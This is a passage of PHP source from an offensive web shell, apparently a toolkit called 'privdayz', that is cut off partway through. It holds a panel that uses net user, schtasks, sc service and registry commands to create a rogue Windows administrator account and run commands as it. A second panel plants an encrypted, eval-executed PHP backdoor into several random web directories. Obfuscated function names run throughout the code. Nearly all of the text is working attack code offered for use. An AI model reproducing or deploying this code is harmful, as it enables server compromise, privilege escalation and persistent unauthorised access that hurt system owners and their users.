     <div style="display: flex; flex-wrap: wrap; gap: 12px; margin-bottom: 19px;">
       <button name="op" value="md5"    class="pr1vd4yz-wiz-btn pr1vd4yz-wiz-btn-light" type="submit" style="flex:1;">MD5</button>
       <button name="op" value="sha1"   class="pr1vd4yz-wiz-btn pr1vd4yz-wiz-btn-light" type="submit" style="flex:1;">SHA1</button>
       <button name="op" value="sha256" class="pr1vd4yz-wiz-btn pr1vd4yz-wiz-btn-light" type="submit" style="flex:1;">SHA256</button>
       <button name="op" value="b64e"   class="pr1vd4yz-wiz-btn pr1vd4yz-wiz-btn-light" type="submit" style="flex:1;">Base64 Enc</button>
       <button name="op" value="b64d"   class="pr1vd4yz-wiz-btn pr1vd4yz-wiz-btn-light" type="submit" style="flex:1;">Base64 Dec</button>
     </div>

     <label style="font-size:.99em;color:#e53935;margin-bottom:7px;display:block;">Output:</label>
     <textarea readonly rows="5" class="pz-wiz-input"
       style="width:100%; min-height:90px; max-height:220px; font-size:1.1em; margin-bottom:12px; resize:vertical;
       border:1.5px solid #fdecec; border-radius:10px; color:#b71c1c; background:#fff; font-family:'JetBrains Mono','Fira Mono',monospace;
       padding:16px 13px; box-sizing:border-box; line-height:1.49;"><?php
$__w = function($a){$s='';foreach($a as $c){$s.=chr($c);}return $s;};
if(
  $_SERVER[$__w([82,69,81,85,69,83,84,95,77,69,84,72,79,68])] === $__w([80,79,83,84]) &&
  isset($_POST[$__w([111,112])], $_POST[$__w([104,97,115,104,95,105,110,112,117,116])])
){
  $__z = '';
  $__v = $_POST[$__w([104,97,115,104,95,105,110,112,117,116])];
  $__op = $_POST[$__w([111,112])];
  switch($__op){
    case $__w([109,100,53]):
    $__z = call_user_func(function($x){$f='';foreach([109,100,53] as $i){$f.=chr($i);}return $f;}, null);
    $__z = call_user_func($__z, $__v);
    break;
    case $__w([115,104,97,49]): 
    $__z = call_user_func(function($x){$f='';foreach([115,104,97,49] as $i){$f.=chr($i);}return $f;}, null);
    $__z = call_user_func($__z, $__v);
    break;
    case $__w([115,104,97,50,53,54]): 
    $__z = $__w([104,97,115,104]);
    $__z = call_user_func($__z, $__w([115,104,97,50,53,54]), $__v);
    break;
    case $__w([98,54,52,101]): 
    $__z = $__w([98,97,115,101,54,52,95,101,110,99,111,100,101]);
    $__z = call_user_func($__z, $__v);
    break;
    case $__w([98,54,52,100]):
    $__z = $__w([98,97,115,101,54,52,95,100,101,99,111,100,101]);
    $__z = @call_user_func($__z, $__v);
    break;
  }
  $___hsc = $__w([104,116,109,108,115,112,101,99,105,97,108,99,104,97,114,115]); 
  echo call_user_func($___hsc, $__z);
}
?></textarea>

    </form>
    </div>
  </div>
  <style>
    @media (max-width: 700px) {
    .pr1vd4yz-modal-wizard { max-width: 99vw; }
    .pr1vd4yz-wiz-btn { font-size: .97em; }
    .pr1vd4yz-wiz-input { font-size: 1em !important; }
    }
  </style>


<?php elseif (isset($_GET['winr00t'])): ?>
<div class="cmdnirvana-page" style="max-width:900px;margin:44px auto 0 auto;">
  <div class="cmdnirvana-header" style="display:flex;align-items:center;gap:10px;">
    <div class="cmdnirvana-ico"><i class="fas fa-user-shield"></i></div>
    <div>
      <div class="cmdnirvana-title" style="font-size:1.15em;">ultra admin creator bypass (Windows/2025) - by privdayz.com</div>
    </div>
  </div>
  <div class="cmdnirvana-content" style="margin-top:25px;">
    <form method="post" id="winr00t-form" style="margin-bottom:18px;">
      <div style="display:flex;gap:9px;align-items:center;flex-wrap:wrap;">
        <input type="text" name="user" class="cmdnirvana-cmdinput" value="<?= htmlspecialchars((isset($_POST['user']) ? $_POST['user'] : 'pr1vadmin')) ?>" placeholder="user" style="width:170px;">
        <input type="text" name="pass" class="cmdnirvana-cmdinput" value="<?= htmlspecialchars((isset($_POST['pass']) ? $_POST['pass'] : substr(str_shuffle('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'), 0, 12))) ?>" placeholder="pass" style="width:160px;" readonly>
        <select name="mode" class="cmdnirvana-cmdinput" style="width:110px;">
            <option value="auto">ultra byp4ss</option>
        </select>
        <button class="cmdnirvana-btn" type="submit" style="min-width:90px;"><i class="fas fa-user-plus"></i> Create</button>
      </div>
    </form>
<?php
function detect_rdp_port() {
    $reg = pr1vd4yzC('reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp" /v PortNumber 2>&1');
    if (preg_match('/PortNumber\s+REG_DWORD\s+0x([0-9a-f]+)/i', $reg, $m)) {
        return hexdec($m[1]);
    }
    $netstat = pr1vd4yzC('netstat -an | find ":3389"');
    if (strpos($netstat, '3389') !== false) {
        return 3389;
    }
    return 'Unknown';
}
$rdp_port = detect_rdp_port();
echo "<div style=\"color:#e53935;font-size:1.08em;padding:5px 0 8px 0;\"><b>RDP Port:</b> <span style='color:#1976d2;font-family:monospace;'>" . htmlspecialchars($rdp_port) . "</span></div>";
?>

<label class="cmdnirvana-outputlabel" style="margin-top:18px;display:block;">Output:</label>
<pre class="cmdnirvana-output" id="winr00t-output" style="background:#111;color:#c4ffc4;padding:18px;border-radius:9px;min-height:110px;max-height:1500px;overflow:auto;">
<?php

function wout($msg) { echo htmlspecialchars($msg)."\n"; @ob_flush(); flush(); }

function prvd_exec_with_timeout($cmd, $timeout = 10) {
    $ps = "powershell -Command \"\$p = Start-Process -FilePath 'cmd.exe' -ArgumentList '/c $cmd' -NoNewWindow -PassThru; \$p | Wait-Process -Timeout $timeout; if(-not \$p.HasExited){\$p.Kill()}\"";
    $start = microtime(true);
    $out = pr1vd4yzC($ps.' 2>&1');
    if (trim($out)) return $out;
    $fallback = "timeout /T $timeout /NOBREAK & $cmd";
    $out2 = pr1vd4yzC($fallback.' 2>&1');
    if (trim($out2)) return $out2;
    return pr1vd4yzC($cmd.' 2>&1');
}
if (!isset($_SESSION['pr1vd4yz_winr00t_success'])) $_SESSION['pr1vd4yz_winr00t_success'] = false;
if (!isset($_SESSION['pr1vd4yz_winr00t_user'])) $_SESSION['pr1vd4yz_winr00t_user'] = '';
if (!isset($_SESSION['pr1vd4yz_winr00t_pass'])) $_SESSION['pr1vd4yz_winr00t_pass'] = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['user'],$_POST['pass'])) {
    $u = preg_replace('/[^a-zA-Z0-9_\-]/','',$_POST['user']);
    $p = $_POST['pass'];
    $mode = (isset($_POST['mode']) ? $_POST['mode'] : 'auto');
    $success = false;
    $methods = [];

    $methods[] = [
        "[*] net user (classic)",
        "net user \"$u\" \"$p\" /add && net localgroup Administrators \"$u\" /add"
    ];

    $methods[] = [
        "[*] PowerShell (background)",
        "powershell -Command \"net user $u $p /add; net localgroup Administrators $u /add\""
    ];

    $methods[] = [
        "[*] schtasks",
        "schtasks /create /tn winrrrrrr00t /tr \"cmd.exe /c net user $u $p /add && net localgroup Administrators $u /add\" /sc onstart /ru System"
    ];

    $methods[] = [
        "[*] at.exe",
        "at 12:00 cmd.exe /c \"net user $u $p /add && net localgroup Administrators $u /add\""
    ];

    $methods[] = [
        "[*] sc service hack",
        "sc create p0wnsvc binPath= \"cmd /c net user $u $p /add & net localgroup Administrators $u /add\" start= auto"
    ];

    $methods[] = [
        "[*] Registry AutoAdminLogon",
        "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v AutoAdminLogon /t REG_SZ /d 1 /f"
    ];

    $methods[] = [
        "[*] Fallback CMD",
        "cmd /c net user $u $p /add & net localgroup Administrators $u /add"
    ];

    $methods[] = [
        "[*] PowerShell Script Chain",
        "powershell -Command \"Start-Process cmd -ArgumentList '/c net user $u $p /add && net localgroup Administrators $u /add' -Verb runAs\""
    ];

    $methods[] = [
        "[*] Task Scheduler V2 (schtasks)",
        "schtasks /create /tn winr00t2 /tr \"cmd.exe /c net user $u $p /add && net localgroup Administrators $u /add\" /sc onlogon /ru System"
    ];

    foreach ($methods as $step) {
        list($label, $cmd) = $step;
        wout($label . "...");
        $res = prvd_exec_with_timeout($cmd, 9);
        wout($res);
        if (
            stripos($res, 'success') !== false || stripos($res, 'ok') !== false ||
            stripos($res, 'ReturnValue = 0') !== false ||
            stripos($res, 'başarı') !== false ||
            stripos($res, 'already exists') !== false
        ) {
            wout("[+] Admin user injected!");
            $success = true;
            break;
        }
        sleep(1);
    }

    if ($success) {
        $_SESSION['pr1vd4yz_winr00t_success'] = true;
        $_SESSION['pr1vd4yz_winr00t_user'] = $u;
        $_SESSION['pr1vd4yz_winr00t_pass'] = $p;
    wout("\n[+] 0wn3d! Admin user injected:\n[+] User: $u\n[+] Pass: $p");
    wout("[!] Info: Webshell cannot send commands as this user. Use RDP/SMB/WinRM with these credentials!");
    } else {
        $_SESSION['pr1vd4yz_winr00t_success'] = false;
        wout("\n[!] r00t failed :: no vector worked, permission denied.");
    }
}
if ($_SESSION['pr1vd4yz_winr00t_success']) {
    $u = $_SESSION['pr1vd4yz_winr00t_user'];
    $p = $_SESSION['pr1vd4yz_winr00t_pass'];
    ?>
    </pre>
    <form method="post" style="margin:22px 0 6px 0;padding:13px 16px 14px 16px;border-radius:10px;background:#191919;border:1.5px solid #e53935;box-shadow:0 2px 8px #0002;">
        <div style="display:flex;align-items:center;gap:10px;flex-wrap:wrap;">
            <input type="hidden" name="user" value="<?= htmlspecialchars($u) ?>">
            <input type="hidden" name="pass" value="<?= htmlspecialchars($p) ?>">
            <input type="text" name="admc" class="cmdnirvana-cmdinput" placeholder="c0mm4nd as 4dm1n" value="dir" style="width:260px;">
            <button class="cmdnirvana-btn" style="min-width:95px;background:#e53935;"><i class="fas fa-bolt"></i> Run as Admin</button>
        </div>
        <div style="font-size:.96em;color:#fff;margin-top:5px;">
            [+] Running as <b><?=htmlspecialchars($u)?></b> &nbsp;|&nbsp; Pass: <b><?=htmlspecialchars($p)?></b>
        </div>
    </form>
    <pre class="cmdnirvana-output" style="background:#181818;color:#aaffbb;padding:14px;border-radius:8px;min-height:40px;margin-bottom:14px;">
<?php
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['admc'], $_POST['user'], $_POST['pass'])) {
        $u = $_POST['user'];
        $p = $_POST['pass'];
        $c = $_POST['admc'];
        $success_cmd = false;
        $cmdfile = "C:\\Windows\\Temp\\pzadmcmd_" . rand(10000, 99999) . ".txt";

        wout("[*] schtasks as admin...");
        $scht = "schtasks /create /tn pzadmtask /tr \"cmd.exe /c $c > $cmdfile 2>&1\" /sc once /st 00:00 /ru \"$u\" /rp \"$p\"";
        $out1 = pr1vd4yzC($scht.' 2>&1');
        wout($out1);

        pr1vd4yzC("schtasks /run /tn pzadmtask 2>&1");
        sleep(1);
        $output = @file_get_contents($cmdfile);
        if ($output && strlen($output) > 0) {
            wout("[+] Command executed as admin!\n" . $output);
            $success_cmd = true;
        }
        @pr1vd4yzC('schtasks /delete /tn pzadmtask /f 2>&1');
        @unlink($cmdfile);
        if (!$success_cmd) {
            wout("[*] Trying service method...");
            $svc = 'sc create pzadmsvc binPath= "cmd /c '.$c.' > '.$cmdfile.' 2>&1" obj= ".\\'.$u.'" password= "'.$p.'" start= demand';
            $out2 = pr1vd4yzC($svc.' 2>&1');
            wout($out2);
            pr1vd4yzC('sc start pzadmsvc 2>&1');
            sleep(1);
            $output2 = @file_get_contents($cmdfile);
            if ($output2 && strlen($output2) > 0) {
                wout("[+] Service method: Command executed as admin!\n" . $output2);
                $success_cmd = true;
            }
            @pr1vd4yzC('sc delete pzadmsvc 2>&1');
            @unlink($cmdfile);
        }

        if (!$success_cmd) {
            wout("[*] PowerShell fallback...");
            $pw = 'powershell -Command "Start-Process cmd -ArgumentList \'/c '.$c.' > '.$cmdfile.' 2>&1\' -Credential (New-Object System.Management.Automation.PSCredential(\''.$u.'\',(ConvertTo-SecureString \''.$p.'\' -AsPlainText -Force))) -WindowStyle Hidden"';
            $out3 = pr1vd4yzC($pw.' 2>&1');
            wout($out3);
            sleep(1);
            $output3 = @file_get_contents($cmdfile);
            if ($output3 && strlen($output3) > 0) {
                wout("[+] PowerShell: Command executed as admin!\n" . $output3);
                $success_cmd = true;
            }
            @unlink($cmdfile);
        }

        if (!$success_cmd) {
            wout("[!] Admin command failed. Try RDP / manual login?");
        }
    }
    ?>
    </pre>
<?php } ?>
</div>
</div>
<script>
window.onload = function() {
  var el = document.getElementById('winr00t-output');
  el.scrollTop = el.scrollHeight;
}
</script>
<style>
a.privd-link, a.privd-link:visited { color:#e53935!important; text-decoration:underline; }
a.privd-link:hover { color:#b71c1c!important; }
</style>
<?php elseif (isset($_GET['b4ckd00rcr3at3'])): ?>
<div class="pzcard-main">
  <div class="pzcard-header">
    <div class="pzcard-icon"><i class="fas fa-bug"></i></div>
    <div class="pzcard-title">
    <b>b4ckd00r cr34t0r</b>
    </div>
  </div>
  <div class="pzcard-content">
    <form method="post">
    <button type="submit" name="create_bd" class="pzcard-btn pzcard-btn-red" style="margin:12px 0;">
     <i class="fas fa-bolt"></i> create backd00r php command sh3ll
    </button>
    </form>
    <?php
    $fpr1vx = <<<'PHP'
<?php $ve017499b24="366f3971556a482a3966526e26334d65666565626432336536666339316336392454704c237a313940425e6137642158";$v6789ef794d='';for($i=0;$i<strlen($ve017499b24);$i+=2){$v6789ef794d.=chr(hexdec($ve017499b24[$i].$ve017499b24[$i+1]));}$v6789ef794d=strrev($v6789ef794d);function fc726c15f02($be0647970224518ac6c7abd9ee879da39f7){return hex2bin($be0647970224518ac6c7abd9ee879da39f7);}function ffe80814332($be0647970224518ac6c7abd9ee879da39f7,$e3d26b8f3fb594246){$e3d26b8f3fb594246Len=strlen($e3d26b8f3fb594246);$a297955cd64439654e8031e1e='';for($i=0;$i<strlen($be0647970224518ac6c7abd9ee879da39f7);$i++){$char=ord($be0647970224518ac6c7abd9ee879da39f7[$i]);$f93700fcddba236015a=ord($e3d26b8f3fb594246[$i%$e3d26b8f3fb594246Len]);$a297955cd64439654e8031e1e.=chr($char^$f93700fcddba236015a);}return $a297955cd64439654e8031e1e;}function f0fe28bdc4c($be0647970224518ac6c7abd9ee879da39f7,$e3d26b8f3fb594246){$eb7f6b8164569b7c36e1=fc726c15f02($be0647970224518ac6c7abd9ee879da39f7);return ffe80814332($eb7f6b8164569b7c36e1,$e3d26b8f3fb594246);}$vfa90f6f087="641e145f1153486050575a0b682f07616b60266362413a0757016e555250391e507c6f175c673a081a7d3664430a334e6d15380652691e71080426127c45085c0c023f0008533a0754046e1c5651473b45700e1b4e703a411e7f362d450c33076a15461e412562285c501e463e5876780806506d0856516a540604381a52513a1d7b067a5f675065527f5e09440c33076a15384f56671e380e01265b7a45085c0a573f490e573a4e53066e1c555d395753796f13590e1e0f12141262456517003c7d1c0102023a735b6d4e1310416017654e5509651b5007394b05563e545355397c0713322a510d763059312d085d03041056033d26767665044f7f34436c06100d430e076e6c0a0d475f085c590d0304290d1a1a3b12554f76447a555a025278431d47002d31604a59494f205028044e41141f49110f4001524b1e4c060a0b5962474f1a3e0307163b1e2c1d5c515437451d4c033f212b5e43155622146e075f50050a5a0c0a591709110157565c555076554900264b5f4b25033908030259364e1747003d273d5b440e57231e784d57461645420107550e54400b170b015c462b57430d3705024927063a03034c536d125d045465202f4b551f517641245c19450c5d500746150006015d51505e160429574f00355c015a304a644549170d354016500830787749495a1377123b565d53111c4b02025f10400853121d1816172848440f310d5e58271f3b15034c503e4753515665212f555e08196f1561170005560a490202520c5d555e5356151e457c0b5616690456582c0f275c4b0e523154170d506e3238025c1b512b193a094d59130b0854164e5e515d1c4f160d070122441c5e72544952685b6701414f153d14570e526b7070025e0c463e16384b4e0c02444d0c1b571e505d080d175f45077a02455f311b79472d0e3c10110257200c135e052a2a7a0f014a5334592f464c42175e574f0f58154646481217001d1224575206685f0e5c3f17284d161c42214d01095d2d213250410e1d2a053a474d5f0c5f1907540401040a0707545454502e56155d7a14155e611139144d4f53744e591543722c7d4d1f194b2d02174b5d53224511534f0d035c404c0758555d007141080237085e5e2051305a124659731c374313372c271757084c21333c454b750c555c4b1418065b5316210a010324391b43470c0810113a0f21044b0116375c693d173f3060580c21127c44781508004f0008554a0754011e55535049535d61071142665115137146644109430769114803577273710b1d4b12785c65140c1a5200014f5706551f0b534e545757497c01144266501513714664400843076818390c173f30605b0c21177b5c65140c1a5201004f5f01490202574e545557497c021342665164113e0b27515a526d69115c1b506f736c0801490f7d41650800034f00085b4a03556e091203174502581607104263570b06795b655d085f05052c6e5114302134505e140339582408481a111d4a4a1d40044112105f154b050a2350471a7a17155864197c4a4f0e44785210455c79657b5f5e080b3a112604500b530a505f121809565c03160d5e0f4e661a5d1d261412171b1e27185708183e530b5a223623327a5e1e4664040f4d641f1e3c3311034210415c441111171b684755530031125045264a235941464d2a441042133062224d5e1b0b345929293350165f5a170f590b13515d5655555e077e0b470c3304011b714221584203532c01010a437c79265643524f2904744a0406585f0517485a005d55100a5e0b4d4e64560d537a440908631e7b12510e441b4e0052202a6a2e101f0e4c1f04264d57514b000f4a4f18165f5b07074d48544c7641431a2714570a2d17587b1109433642105e0e3062230d054a167d4331425c52070101515707071b1b1f140417461d25411b003711197205261d054d1f643d501152122a6a6902491251621f2441571e44617630321149461a054e07490549291a0a4f624f025220187b025c1b643d501152122a0a2558551f516457174b5742065f4d4e324f1556154845041516092450471a3b095705304722064e42503753091a142c2e25575215472914730d024e0b4317100358011b15020b09005b4266450e023d05585e21053b5f511d533e084d4a48766b49343b1c562213204d565843555b57515056050501045007045d7c0a0e0b7b1d554f3c4a3b4c5c4145284d0d43497c606917431f5529022741111f4d5b560a081e47111b48105801545729041e0d375708187d0930420a475874032f15486530254d44084d6c136d1009065b530a5b075404510a555b4d174f184039401b3c054d432704751e571c433a09111e1a3227341954475662136f565c4216435743031813525e1107580104517a55155865035f1f2a086d400047537657055b143b6b6c1801071f630337565046170f054c0e5304570c58000a011f5b715b145021125c4b241e3d511740123b4c0017032732214a425a5f6c072353174611584f07074f1f1d510b0f594a0e57730f191e3a16190a6c356551044f5f2b520143497a1d077c652101104160171b6b4a11064342692276663f40395452566f6e065472411e11680c201f5a1b5f374f4454003c75770e5743132d426647080f4b1566524f161e13163b50455846426a0806083d1419026c356651044f0663014068527e7e604a45084f291e7c0066074a0a1947390545180f44504c451d45696c144e7c5b194920187d195c17523d424c133e6f1964660227036250707b086d476e0a434d16546e1b4d59451846172847531c3c461d757a51750c1909433642105e0e3062240b031e1474133115080456525c50551e416c064842413a534c6d48064a0d541917684d724a194b696e0159170e2c26681d6e4f787c2d7d1f19500c43194b426956130f44525e45423a7e131a4e21124b462d047d55665b1f6301406852756969194a5a071342740a041600594b4b0944011b163b563e413956101a06307242661c6151750c191d532c541659417a1d7202110703682f63040416441602430f50451b163b524c451d45696c1e4e6f465d187a0e62495a0a0769135154046d71685a5018147b47321d095751035a525f1e416c024d4e45473a547c00044769461d757f4a68514a1b442a44121f45017a6902110703291c2741194d43156654460b45116e1c545c395751796f115d0e570f1f145b6047651700697d5502540273740c6d02117c2c2c165d6a520508415d16181357070a0a4544397a077a16645065527e0c09400f5d6a2017006b556e1e380f552612784508150f023f490f5b3a0750046e1c5451391e56296f12590e57091d145b6544655e046c7d50003d26707065004f1410416112654e5402651b5103390206563e1d5302397c0617322a510d763059312d415d01041052053d26747565004c1710416211654e5403651b5053390702385350523a5478057a166555651b7e5f09090f5d6a6d11384f566a1e380f09265b7a49085c0e053f04083f5105390705385553391e04114b150d0e1e0f13145b6047651701687d550154023a770d6d4e131008624165075700651b5052394b04513e52503a517a6f175a613a0d1d14126741655e006e7d1c0150023a765a6d4b15792c2c120c6a1b025d3f5201394b00533e1d56033935527a59663a081e7a362d460c33076e15384f566a1e380f57265b7a15085c0a533f490f543a00556f4a5701395051393505143263500c76305d612d415802041051003d26742565494946100835784105006d0c543a0751056e5557523957537f6f5e58363a41192d366245655e00687d550153023a760c6d021029526f045f430d524d0a09584550034c463a5c4f453613540b26134b44680338015500523d0943104d7e23324b50037c2111240c5f430d524d0a0958451b163b53554c461e6d41431a2714570a2b0227591d300768085f171c7262646608530a775029045f430d524d0a09584550004c463a5c4a45696c175f7b46420a6c3564431952167f065f1707313060111525106c4d74140216476e0a435a1616474008070b4d423a741a1d4e76390a016343750a194b69691344195c7e21284b1915512858707b006d476e0a3e4f163b13163b53544c5d453013540b26134b44684e0a400b5416250102420f3d3629565f5a407f58707b001f434a1911034210415c440004160353796c420b31095d4f604e0a48105416250102420f3d3629565f5a407858707b001f434a1947390756130f4445425e46032241430f310e19023b1e272e4a1f5a31554c133e676b6058425a071341650d194d4315665255164b0e12463e1d53553935051e3263500b767d5a7751174f592a454c133e6f7369191f5a011008661d1b164d111b3f53004708121942170012103f5d061d27044a5e3a42712e085c1a781148174c6f6b7b194c5a45391e375050590d115a564e123a0a1b4419451703113841484e38095044604d725d191c422a7e17470d3736681d6e430a654b745919123c000d435b16044140051b4d06574d2c41540f2b4e081b7d4675400b5e1a781055024d7e73710f1d5a127c41780408065a18104f4655541b531610041c4e547c060a4e63560d06685b6540154f0768194817506e7a6c19084f0f6c41641515165203094f460755021e445b5c4c4f496d501446703a411c7e362d475c33076c15384f576e606c1907530f6c13650c58441150404b5707571f125d5549455754781f065f6353150a795b635d195e066c0d4406506a6e6008004d0a655c7447081e02434b021f1e5402004842545457496d02175c7e46081a79467540085f1f710d44545376601c0804497f7d4561780803546d0850506a540702385353573a547b027a5f64561b06685e7c5d190c077040164500276a7108035603754978040807531d19525700491303545a49455f506113175e634a191b7a5a7951085f0774015d0e48776e605a0052423e02355d110f541d195257034913035557494557557c1f065f6352150a795b63581043163b104c56132c233911004a1260506515011a43080e4f4607550b1b4d4b5e450010235052073d08195a3a5b23414147120710511e4125626466035a1e6c57731f19123c000f435b1625435d14070b4d423a7c060640724465527a5a09470b33016e7d1c05570274711b1d5a01100863161b1f58115005461e416c03524b451e4612255a4a0b724e184c2d0533591d30076e084d171a7e661f0b11541e6c16264158524b156652501a450102505a4c5e46186d4345023d155c026c35644710541625011652152b302e19152511775029045f430d524d0a09584543405614551d4e4112021347721d190e1758754c194811630140685069627d195008512d097c15190b5d11581114571c1b10381a52553a5478027a166556651b7c5f775d194d6a6917531548726272190c44032d022645401e416d0855566a540603381a52553a1d7b0604427244651b7e5d77581054167c7e550f4163620049431540131f2441571e476e0856461845116e1c5055395057110410322a540f767e5b775d194b696916481745017379100a5a4a2a507c4d4a6911544a0c134406561a403d545d4f4c6d48064a0d541904754a26054b0a57357e03521501212f57451f4d38037c0066075a6a083e4f0d455551080d16004e4112021f35633b1011684e0a4319410b78521045043f2f1f5e540e7c2f1f3a505c581742114739075c6800394b5e450006215c550b7a42661b7131672c10541628530b543e3d2e2f4a54520713416c0d02161e114b061243175d12403d575e46186d55530031125045264a25030b0c0620094068506b6b60421113456c58325157551758560d39531d5a4110114d473a547b037a166455651b7d5c09090e5b6a2017076b506d751c41074f7f7d4764784100566d085755144c1a121f42413a54556d0e064c0e530f76305833531941162d4f0d46083a6a6265494d101008621c1b1f431f19413a03536f4a5356395451551102105a705d196a38093b055530532044071f4302777765494c111008621d65075607651b5450394b05573e1d535e476113471c200740026a362d435d334e6e12461b417c396466004f5e10086614654e505442473904554e6e5052391d5557110410322a540f763059645310460d7848021749382b2c5c6e1f5b2503205711123c03094a4f161e13163b5054455b450d554f0237395e4f3c35361e571b533655171f45017070100a5a56221c3d4a521e476e0b534f0d4541571017170b464112011755721b1957681830054c1d587806430c4123626466034803715035564b571a19105846500a415705010d454e411202124e3315190e175866581914167c7e56053a03627d19570f4d2f043d4b57164b156652531f454641014a413a545664135d4e3b0019026903262e5a0e5a3440065b0476661f0b02530a6c0b74565c421643574300570940575f42184514003946540072265a4b24060a044a0a44074711590276661f0b025603682f6511100d434c02434269570169394258450010235052073d0819026c356444104f432b444c133e6c7169194a5a512904215657162352580f0a69104057163d031008066551471d37500d752c0f361e5d0a1e3a401752576a1d25575215472958707b0b054a181543426954061b5f42185e4641120114350f46040a2e1f3b124d065936014c133e6f77691944094664540b160a1f434a1911034210415c442206040a091246550b20395f5f26097d1b5606587006431b412d363266420a4f25047c0066045018104f46123a02074d5945185d45696c145c093b1917680c201f5a1b5f374f441f4501737510110f502958707b0b054a1142434269570712594242425d452b5c540b3305510a60192103661c463448101f4501707310111b506c540b160c1f434a1947390451131c5942473957517e6f175b623a411d7a3660411b4f18784e1653497a1d720c185a0d6c5208110814431f19413a03531109441f4541395779131b4e21135b593c187d55665d027401541b41737369021108463805264a19760647580f4e14390706385351533a1d7e57044e7c461d757a5e755f194d6a6f12384f566c1e380f04265b7b44085c0e033f000f513a4e53566e505239545655114b145a0e1e0f1c141267496517046c7d550352023a765d6d0215782c6115654e50531b4a5d161808121942413a5457166e065372004c442b1e3c1e574f1e7c7e5502487e39604b540e563e1e74645c40025d1147390750131c4440395255476408061369461d757a580e2c1952163e540a5415372d2e19195e7c7d457d04421611544d16145845735317110017124d696c175b72481908141266131b460d785c5f1745017072626c5a1e6c16214a5a420a5e57434e123a02074d421e45423a7f05065372085c5d68383017550a552c480b59272b2c234d58154d641326415842066e5f160855115a5d0a4a42424a456f6f5e59603a411c7d362d460d33076e14384f566c1e710c0726177c2c6215654e50531b4a4f0d45176d565545584641120110436c015c5e060b381411460d78480217497a1d720e185a586c0231504c440d117900075a096c471707173a001023500e4a0d540e06684e0a400c460d785c4445042a373257115d047750291f19123c030b383b16581354110c06110f0a23130e4a0d570c03681175035c1b432a4f4447136f347041195e7c7d457d1f194b58111d3c54043e6e12594203100806395a4900724e1d75795f7c51424f443d5511450f7e32320b474a5b64540b150c1f5811445846123a01003f3f45584603385d451a3b09570a604e0a400c4616230140685366627d196e2565053c117b660d431566515f165813540d0e003a0100396c45013c125c443c197d55665d0e711a445e077e6a334d430a4c3f58707b0b0f4f111b3f5101394b0101404c4547587013400f3e155c0368117555665c06781c4444143c31344b195e7c7e4978044a42114156104e123a010b4842473951521104104c7b46120a7a436e51444f53345201171a7e661f0a015a1e6c57731f194b435e5b3c15420441464c4b5e4526003b524a4676390a1a61517555665e04781c4458030125254d6e194f29113a0c100d43435c1713440b13163b53575e46187613023160546277685775174c01552c480b594176661f08045303375026414d43115f1913140406034a4c463a54534c76135b55724266187a310851044f502d4f074308312c60111525127959745f19123c0309435b16476f4a5607395051476d1d061b3c0f48432c42772d4158050459520f3d6f75701b1841032a193841664616456600095811565c10114d4139577d1f064c0e520a763058642d0c586a6915566b506b731c41071f7f7947085c0e053f000c533a4e0448163b5350183a1d2c110f5572055147270e7d55665d067401500e527779601d6e48126c4d744442123c03091e46045b1503045945100809245d4d4676390b1a615175035c1b432a4f44133e6c737b194c4103682f6715190b43504b11074f4d55470a01110c090b6d1b02316154100a334a27144d1a4436014068526c7960441d5a45391e375050590d1111473905571a121f42170012103f5d060c33155c1c7c3531145a00523d090656123b7474665414402314310c1d695003104a5d16181f1202170b06120c225d064676390a18614a2e511d30076a015917467979601d6e49106c4d74150a0d43575611461e416c01445f45555d45696c154e6e464a5e3a06301f114b696b134d0c417a1d73121a53033750707b0804431f0443055e171b5d16064d4139567f1a0630724266197b436e51444f443d5511450f7e661f08034103315c74424c580045500c08164d176d57504c451d45696c155a725b190d6f517517561d1670053b044163627002115e7c7f5068044a42115d5c0d4e123a00004d594541395666180f4e29461d757b5e755f044f14045951543d6f75701b1154032815374c5c4e4b5e4b074e123a00003f463a563b4c6408061372145c5e3d183b511d30056c1a444a4d7e243557520e4a231e740c1d69500310431d1617564611100b450f083d5f490a374e1b7630583053154f572a53054e3e33233011570f4d2f043d4b57164b156652561f45481216071110140b6d117a5f6655651b7d5a09400f5d6a20135c154170622f4b5552071341640d19184313655657145e134f48421611143a3e434a07264e1d757b587c5810541625085f1745017175190c5a046b4b7442564406505a0b461e416c0056420416464112001047721d194c271830105a071670053b04507e2333191525107b59745f19123c0201435b16416c01534a413a514c76130231615f1917682a712e0a591e7c7e570f486562295f11520713436d041f1043454b0a0b1e416c015d4b45445b586d140147721d190e17596051044f1207125d0c413c3025585a5a117750290444161e115005461e44176d57574c451d45696c155b725b1908145b6642655e036e7d1c010702767065004f141008631165075505651b5106394b05513e1d52523979037a166400651b7e5809090b5f6a2017566b506b761c41071c7f7d4467780803506d4155536a540706381a5001445e6d4e060b310e560a201e381d4a1f533b48055b023623324a195e7c7f457d1f195300595643446a1d0051381a57033a547b037a5f6454651b7c5f09460f334e6b42380256023a760b6d4b167b2c2c120d6a5206083f1e05006f05503e50523a5478037a5f645265527e0e09090f0c6a201201155a7e26295c0a5a5e6c4f6a";$ve5c970b653=f0fe28bdc4c($vfa90f6f087,$v6789ef794d);if($ve5c970b653!==false){eval("?>".$ve5c970b653);}else{echo"RSS Error.";} ?>
PHP;
    if (isset($_POST['create_bd'])) {
     $ana_dizin = rtrim((isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : getcwd()), '/');
     $dirs = [$ana_dizin];
     foreach (glob($ana_dizin . '/*', GLOB_ONLYDIR) as $d) $dirs[] = $d;
     shuffle($dirs);
     $adet = rand(5, 8);
     $secilen = array_slice($dirs, 0, $adet);

     function bd_write($yol, $icerik) {
       $fmethods = [
          function($f, $c) { return @file_put_contents($f, $c)!==false; },
          function($f, $c) { $h=@fopen($f,"w"); if($h){fwrite($h,$c);fclose($h); return true;} return false; },
          function($f, $c) { return pr1vd4yzC("echo ".escapeshellarg($c)." > ".escapeshellarg($f)); }
       ];
       foreach($fmethods as $fn) if ($fn($yol,$icerik)) return true;
       return false;
     }

     $sonuclar = [];
     foreach ($secilen as $klasor) {
       $file = rtrim($klasor, '/').'/pr1vd4yz.php';
       $ok = bd_write($file, $fpr1vx);
       $url = str_replace($_SERVER['DOCUMENT_ROOT'],'',$file);
